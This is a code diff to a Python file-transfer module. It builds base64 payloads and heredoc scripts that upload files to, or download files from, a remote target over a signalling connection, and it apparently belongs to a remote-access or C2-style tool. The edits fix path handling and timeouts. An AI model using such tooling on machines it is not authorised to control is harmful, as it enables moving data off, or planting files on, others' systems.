@@ -1,3 +1,4 @@
+import asyncio
 import base64
 import json
 import textwrap
@@ -23,6 +24,7 @@ def build_transfer_payload(source_path, remote_path, mode="upload"):
             "mode": mode,
             "path": remote_path,
             "is_directory": False,
+            "filename": source.name,
             "size": len(data),
             "content": base64.b64encode(data).decode("ascii"),
         }
@@ -59,6 +61,11 @@ def build_transfer_command(payload):
 
         if payload.get("mode") == "upload":
             target = Path(path)
+            if not payload.get("is_directory"):
+                if target.exists() and target.is_dir():
+                    target = target / payload.get("filename", target.name)
+                elif str(path).endswith("/"):
+                    target = target / payload.get("filename", target.name)
             target.parent.mkdir(parents=True, exist_ok=True)
             if payload.get("is_directory"):
                 target.mkdir(parents=True, exist_ok=True)
@@ -68,7 +75,7 @@ def build_transfer_command(payload):
                     file_path.write_bytes(base64.b64decode(encoded))
             else:
                 target.write_bytes(base64.b64decode(payload["content"]))
-            print(json.dumps({{"status": "success", "path": path, "mode": "upload"}}))
+            print(json.dumps({{"status": "success", "path": str(target), "mode": "upload"}}))
         else:
             source = Path(path)
             if source.is_file():
@@ -102,7 +109,7 @@ def build_transfer_command(payload):
     return f"python3 - <<'PY'\n{script}\nPY"
 
 
-async def _run_transfer(target, payload, timeout=60):
+async def _run_transfer(target, payload, timeout=120):
     signal = SignalClient(ROOM, client_id, HOST, username=username)
     await signal.connect()
 
@@ -115,6 +122,9 @@ async def _run_transfer(target, payload, timeout=60):
             wait_for_result=True,
             timeout=timeout,
         )
+    except asyncio.TimeoutError:
+        print("[-] File transfer request timed out")
+        return None
     finally:
         await signal.close()
 
@@ -139,8 +149,13 @@ async def upload_file(target, local_path, remote_path=None):
 
 
 async def download_file(target, remote_path, local_path=None):
+    remote_path_obj = Path(remote_path)
     if local_path is None:
-        local_path = Path(remote_path).name
+        local_path = Path(remote_path_obj.name)
+    else:
+        local_path = Path(local_path)
+        if local_path.exists() and local_path.is_dir():
+            local_path = local_path / remote_path_obj.name
 
     payload = {
         "type": "file-transfer",
